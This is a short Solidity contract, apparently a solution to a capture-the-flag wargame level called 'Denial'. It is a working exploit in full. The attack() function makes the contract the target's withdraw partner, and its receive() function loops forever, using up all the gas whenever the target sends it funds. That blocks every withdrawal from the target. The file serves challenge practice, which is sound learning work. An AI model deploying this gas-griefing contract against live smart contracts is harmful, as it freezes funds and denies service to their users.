pragma solidity 0.8.15;

import "../challenge/Denial.sol";
contract DenialAttacker {
    uint256 gasWasted;
    function attack(address target) external {
        payable(target).call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
    }

    receive() external payable {
        while(true) {
        } 
    }
}